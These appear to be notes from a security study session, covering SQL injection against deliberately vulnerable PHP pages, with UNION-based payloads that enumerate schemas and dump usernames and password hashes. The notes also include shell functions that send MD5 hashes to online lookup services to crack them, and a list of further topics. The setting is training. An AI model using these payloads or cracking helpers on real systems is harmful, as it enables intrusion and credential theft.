## 勉強会 5月27日

http://example.com/bad/check-inj.php
http://example.com/bad/bad-inj.php
http://example.com/bad/bad-inj-show.php

```
ed@example.com
a" OR 1 = 1 -- 

a" UNION ALL SELECT TABLE_SCHEMA,TABLE_NAME from information_schema.TABLES; -- 
a" UNION ALL SELECT COLUMN_NAME,COLUMN_TYPE from information_schema.COLUMNS where TABLE_NAME = "my_users"; -- 

a" UNION ALL SELECT user_login,user_pass from my_users; -- 
a" UNION ALL SELECT user_email,user_pass from my_users; -- 
```


http://www.md5online.org/

```sh
function getmd5    { md5 -s $@ | cut -d' ' -f 4 ; }             && export -f getmd5
function decodemd5 { curl http://md5.gromweb.com/query/${1} ; } && export -f decodemd5
function test_pass { decodemd5 $(getmd5 $1) ; }                 && export -f test_pass

function slow_decode_md5 {
    curl http://www.md5online.org/ --silent -X POST -d "md5=${1}&search=0&action=decrypt&a=11661742" \
    | grep "class=\"result\" id=\"loading\"" ;
} && export -f slow_decode_md5
function slow_test_pass { slow_decode_md5 $(getmd5 $1) ; } && export -f slow_test_pass
```

slow_decode_md5 41ba3c6e60b36f1baeed1cd9cb1ccb15
decodemd5 2a9d119df47ff993b662a8ef36f9ea20
decodemd5 59048c039f90319993ca534cbf86c95e


Injection
Xss
Password hashing and rainbow tables

Two-factor authentication
Heart bleed 
Visible files from web server

